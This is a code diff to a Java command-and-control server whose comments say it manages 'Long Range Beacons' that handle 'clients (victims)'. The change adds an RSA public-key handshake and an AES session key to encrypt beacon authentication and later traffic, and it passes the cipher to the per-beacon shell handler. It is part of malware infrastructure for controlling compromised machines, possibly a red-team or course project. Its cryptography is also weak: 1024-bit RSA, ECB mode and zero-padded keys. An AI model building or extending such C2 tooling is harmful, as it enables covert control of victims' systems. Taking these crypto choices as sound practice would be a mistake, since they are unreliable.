@@ -5,8 +5,11 @@ import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.SocketException;
 import java.util.HashMap;
+
 import Servers.Duplexer;
 import Servers.notifyLock;
+import Servers.encryption.aes.*;
+import Servers.encryption.rsa.*;
 
 public class C2Server implements Runnable{
     // Dictionary of all of the longRangeBeacons currently reporting back to the C2
@@ -31,6 +34,8 @@ public class C2Server implements Runnable{
     // ID used by threads to make sure that .notify() is not called extra times multiple times
     private int shellID;
 
+    private rsa rsa;
+
     /**
      * Initializes a Command and Control Server to handle connections from Long Range Beacons
      * Long Range Beacons handle all of the clients (victims)
@@ -42,6 +47,7 @@ public class C2Server implements Runnable{
         this.longRangeBeacons = new HashMap<>();
         this.serverSocket = new ServerSocket(1234);
         this.userHandler = new C2ServerUserHandler(this);
+        this.rsa = new rsa(1024);
     }
 
     /**
@@ -129,18 +135,31 @@ public class C2Server implements Runnable{
                 String unformattedIPAddress = socket.getRemoteSocketAddress().toString();
                 String IPAddress = unformattedIPAddress.split(":")[0].substring(1);
                 attemptedAuthIP = IPAddress;
+
+                // Send public key to beacon
+                duplexer.send(rsa.getN(), true);
+                duplexer.send(rsa.getE(), true);
+                
+                // Beacon key will encrypt the AES session key with the RSA public key
+                String x = duplexer.receive(true);
+                x = x.substring(0, x.length() - 1);
+                String aesKey = rsa.decrypt(x);
+                if(aesKey.length() % 8 != 0){
+                    aesKey = "0" + aesKey;
+                }
+                aes aes = new aes(aesKey, modes.ECB);
                 
                 // Receive initial message for authentication from the new Beacon
-                String hashedPassForAuth = duplexer.receive();
+                String hashedPassForAuth = aes.decrypt(duplexer.receive(true));
 
                 // Pass this hash to the User Handler thread for MFA
                 String authResponse = userHandler.authenticateToC2(hashedPassForAuth, IPAddress);
-                duplexer.send(authResponse);
+                duplexer.send(aes.encrypt(authResponse), true);
                 if(!(authResponse.equals("Authentication Successful"))){
                     duplexer.close();
                 }else{
                     // Create a new thread to handle each Long Range Beacon
-                    C2ServerBeaconHandler beaconHandler = new C2ServerBeaconHandler(duplexer, IPAddress, this, shellLock);
+                    C2ServerBeaconHandler beaconHandler = new C2ServerBeaconHandler(duplexer, IPAddress, this, shellLock, aes);
                     Thread beaconHandlerThread = new Thread(beaconHandler);
 
                     // Store IP and Duplexer pointer in the dicitonary
